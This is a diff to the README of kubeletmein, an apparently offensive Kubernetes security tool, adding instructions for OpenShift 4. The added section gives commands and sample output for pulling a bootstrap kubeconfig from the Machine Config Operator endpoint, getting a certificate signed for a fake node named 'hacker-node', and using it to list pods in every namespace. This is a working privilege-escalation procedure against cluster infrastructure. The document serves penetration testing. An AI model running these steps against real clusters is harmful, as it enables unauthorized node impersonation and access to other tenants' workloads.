@@ -12,6 +12,10 @@ There's more info in our blog post at [https://www.4armed.com/blog/hacking-googl
 
 ## Supported providers
 
+### OCP4
+
+OCP4 is fully supported and relies on the MCO
+
 ### GKE
 
 GKE is fully supported and relies on the metadata concealmeant being disabled (the default setting).
@@ -34,6 +38,31 @@ I should probably look at Azure at some point but....Microsoft. ;-)
 It's a single binary compiled for Linux. Download it with `cURL` or `wget` from the releases page at [https://github.com/4armed/kubeletmein/releases](https://github.com/4armed/kubeletmein/releases).
 
 ## How to
+
+### OCP4
+
+On OCP4 kubeletmein is a two stage process. First we write out a bootstrap-kubeconfig from the MCO endpoint. Then we generate a certificate sigining request and use the bootstrap config to submit it to the API for approval.
+
+```
+~ $ kubeletmein bootstrap ocp -m https://api-int.<name>.<baseDomain>:22623/config/master
+2019-05-10T10:32:51+02:00 [ℹ]  wrote bootstrap-kubeconfig
+2019-05-10T10:32:51+02:00 [ℹ]  now generate a new node certificate with: kubeletmein generate -b /tmp/bootstrap-kubeconfig -k /tmp/kubeconfig -n hacker-node -d /tmp/pki
+```
+
+Then we download the certificate and configure `kubeconfig`.
+
+```
+~ $ kubeletmein generate -b /tmp/bootstrap-kubeconfig -k /tmp/kubeconfig -n hacker-node -d /tmp/pki
+2019-05-10T10:33:33+02:00 [ℹ]  using bootstrap-config to request new cert for node: hacker-node
+2019-05-10T10:33:33+02:00 [ℹ]  got new cert and wrote kubeconfig
+2019-05-10T10:33:33+02:00 [ℹ]  now try: kubectl --kubeconfig /tmp/kubeconfig get pods --all-namespaces
+```
+
+Now you can use the kubeconfig, as it suggests.
+
+```
+kubectl --kubeconfig /tmp/kubeconfig get pods --all-namespaces
+```
 
 ### GKE
 
